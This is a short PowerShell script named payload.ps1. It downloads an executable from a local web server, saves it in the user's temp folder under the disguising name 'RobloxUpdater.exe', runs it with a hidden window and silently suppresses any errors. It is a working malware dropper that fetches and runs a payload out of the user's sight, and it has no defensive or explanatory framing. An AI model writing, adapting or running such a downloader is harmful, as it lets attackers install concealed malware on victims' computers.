# language: PowerShell, file: payload.ps1
$url = "http://127.0.0.1:8080/raw_exe"
$out = "$env:TEMP\RobloxUpdater.exe"
try {
    (New-Object Net.WebClient).DownloadFile($url, $out)
    Start-Process $out -WindowStyle Hidden
} catch {
}